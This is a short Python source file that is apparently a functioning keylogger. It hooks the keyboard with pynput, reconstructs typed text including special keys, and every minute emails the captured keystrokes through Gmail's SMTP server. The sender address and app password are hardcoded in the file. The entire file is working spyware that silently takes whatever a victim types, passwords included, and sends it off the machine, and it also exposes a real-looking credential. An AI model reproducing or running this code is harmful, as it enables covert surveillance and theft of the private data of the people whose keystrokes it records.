import smtplib, ssl
import time
from pynput.keyboard import Listener, Key
from threading import Thread, Lock

SMTP_SERVER = "smtp.gmail.com"
PORT = 587
SENDER_EMAIL = "munazzah302@gmail.com"
PASSWORD = "gppp unjx yfuw vvtx"  
RECEIVER_EMAIL = "munazzah302@gmail.com"


keystroke_message = ""
last_key = None
last_time = 0
start_time = time.time()
lock = Lock()  


def send_email(message):
    print(f"Sending email: {message}") 
    try:
        context = ssl.create_default_context()
        with smtplib.SMTP(SMTP_SERVER, PORT) as server:
            server.starttls(context=context)
            server.login(SENDER_EMAIL, PASSWORD)
            server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, message)
            print("Email sent successfully!")
    except Exception as e:
        print(f"Email error: {e}")

def on_press(key):
    global keystroke_message, last_key, last_time

    current_time = time.time()

    try:
        with lock:  
            if hasattr(key, 'char') and key.char is not None:
                
                if key.char == last_key and (current_time - last_time) < 0.3:
                    return  
                keystroke_message += key.char
                last_key = key.char
                last_time = current_time
            else:
              
                if key == Key.space:
                    keystroke_message += ' '
                elif key == Key.enter:
                    keystroke_message += '\n'
                elif key == Key.tab:
                    keystroke_message += '\t'
                elif key == Key.backspace:
                    keystroke_message = keystroke_message[:-1]
                else:
                    keystroke_message += f'[{key.name}]'
    except Exception as e:
        print(f"Key logging error: {e}")


def email_sender():
    global keystroke_message, start_time
    while True:
        time.sleep(60) 
        with lock:
            if keystroke_message: 
                send_email(keystroke_message)
                keystroke_message = ""  
        start_time = time.time()


def start_listener():
    if hasattr(start_listener, "running"):
        print("Listener already running!")
        return
    
    start_listener.running = True 

    Thread(target=email_sender, daemon=True).start()  
    with Listener(on_press=on_press) as listener:
        listener.join()

start_listener()
